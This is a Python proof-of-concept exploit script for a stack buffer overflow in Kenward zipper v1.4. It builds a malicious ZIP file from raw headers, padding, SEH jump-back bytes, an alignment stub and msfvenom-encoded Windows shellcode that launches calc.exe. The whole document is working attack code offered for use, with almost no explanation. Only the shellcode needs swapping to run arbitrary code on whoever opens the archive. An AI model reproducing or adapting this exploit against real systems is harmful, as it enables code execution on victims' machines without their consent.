# Exploit Title : Kenward zipper v1.4 0day Stack Buffer Overflow PoC exploit
# Reference: https://www.exploit-db.com/exploits/11834
# Reference: https://www.exploit-db.com/exploits/11872

filename = "exploit-calc-subeax.zip"

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")


print "[+] Building attack string..."

# offset 
exploit = "A"*242

# NOP + jmp $+12 + NOP
exploit += "A"*0x10 + "\x89\x10" + "A"*0x10

# jmp to here
#nasm > push esp
#00000000  54                push esp
#nasm > pop eax
#00000000  58                pop eax
# set Stack Addr to eax. And eax = eax + 0x67c
#>>> hex((0x10000067c)*-1 & 0xffffffff )
#'0xfffff984'
#>>> hex(0x5555532b*2 + 0x5555532e)
#'0xfffff984'
exploit += "\x54\x58" + "\x2d\x2b\x53\x55\x55"*2 + "\x2d\x2e\x53\x55\x55"

# before execute, EIP == EAX
exploit += "A"*(386 - len(exploit))

# msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f py -v exploit
exploit += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
exploit += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
exploit += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
exploit += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
exploit += b"\x42\x75\x4a\x49\x79\x6c\x6d\x38\x6c\x42\x53\x30"
exploit += b"\x43\x30\x47\x70\x61\x70\x4b\x39\x7a\x45\x55\x61"
exploit += b"\x4b\x70\x75\x34\x4e\x6b\x42\x70\x70\x30\x6e\x6b"
exploit += b"\x33\x62\x36\x6c\x4c\x4b\x50\x52\x44\x54\x4e\x6b"
exploit += b"\x43\x42\x35\x78\x76\x6f\x58\x37\x71\x5a\x56\x46"
exploit += b"\x74\x71\x49\x6f\x6e\x4c\x37\x4c\x30\x61\x71\x6c"
exploit += b"\x47\x72\x34\x6c\x45\x70\x39\x51\x78\x4f\x76\x6d"
exploit += b"\x63\x31\x4a\x67\x48\x62\x7a\x52\x66\x32\x72\x77"
exploit += b"\x6e\x6b\x62\x72\x54\x50\x4c\x4b\x30\x4a\x47\x4c"
exploit += b"\x4c\x4b\x32\x6c\x62\x31\x50\x78\x6d\x33\x73\x78"
exploit += b"\x45\x51\x5a\x71\x53\x61\x6e\x6b\x72\x79\x61\x30"
exploit += b"\x57\x71\x6e\x33\x6e\x6b\x77\x39\x75\x48\x4a\x43"
exploit += b"\x46\x5a\x31\x59\x6c\x4b\x45\x64\x6c\x4b\x47\x71"
exploit += b"\x39\x46\x64\x71\x6b\x4f\x6e\x4c\x59\x51\x7a\x6f"
exploit += b"\x56\x6d\x56\x61\x79\x57\x30\x38\x39\x70\x71\x65"
exploit += b"\x38\x76\x55\x53\x43\x4d\x4c\x38\x37\x4b\x61\x6d"
exploit += b"\x56\x44\x54\x35\x68\x64\x62\x78\x4e\x6b\x36\x38"
exploit += b"\x74\x64\x46\x61\x4b\x63\x75\x36\x4c\x4b\x54\x4c"
exploit += b"\x42\x6b\x4c\x4b\x43\x68\x65\x4c\x36\x61\x4b\x63"
exploit += b"\x6e\x6b\x46\x64\x6c\x4b\x53\x31\x38\x50\x6d\x59"
exploit += b"\x42\x64\x34\x64\x64\x64\x43\x6b\x53\x6b\x43\x51"
exploit += b"\x50\x59\x52\x7a\x46\x31\x4b\x4f\x4b\x50\x63\x6f"
exploit += b"\x71\x4f\x42\x7a\x4c\x4b\x54\x52\x4a\x4b\x6c\x4d"
exploit += b"\x53\x6d\x33\x5a\x56\x61\x4c\x4d\x4c\x45\x4c\x72"
exploit += b"\x67\x70\x77\x70\x73\x30\x76\x30\x62\x48\x55\x61"
exploit += b"\x6c\x4b\x62\x4f\x6e\x67\x79\x6f\x69\x45\x6f\x4b"
exploit += b"\x38\x70\x68\x35\x6f\x52\x62\x76\x55\x38\x69\x36"
exploit += b"\x6f\x65\x6d\x6d\x4d\x4d\x59\x6f\x68\x55\x67\x4c"
exploit += b"\x67\x76\x73\x4c\x35\x5a\x6f\x70\x39\x6b\x4d\x30"
exploit += b"\x34\x35\x57\x75\x4d\x6b\x53\x77\x72\x33\x32\x52"
exploit += b"\x72\x4f\x42\x4a\x55\x50\x73\x63\x6b\x4f\x39\x45"
exploit += b"\x35\x33\x30\x61\x42\x4c\x50\x63\x66\x4e\x72\x45"
exploit += b"\x34\x38\x43\x55\x77\x70\x41\x41"

exploit += "\x41"*(1022 - 12 - len(exploit)) 

#nasm > jmp $-0x300
#00000000  E9FBFCFFFF        jmp 0xfffffd00
exploit += "\x82\x96\x81\x98\x98" + "A"*7

# short jmpback + pop,pop,ret in zip4.exe
#nasm > jmp $-12
#00000000  EBF2              jmp short 0xfffffff4
exploit += "\x89\x95\x41\x41" + "\x5b\x48\x47\x00"
exploit += "D"*(4068 - len(exploit))

print "[+] Writing payload to cst-kenzip.zip"
# write the payload
mefile = open(filename,'w');
mefile.write(ldf_header + exploit + cdf_header + exploit + eofcdf_header);
mefile.close()
print "[+] Exploit file created!!"
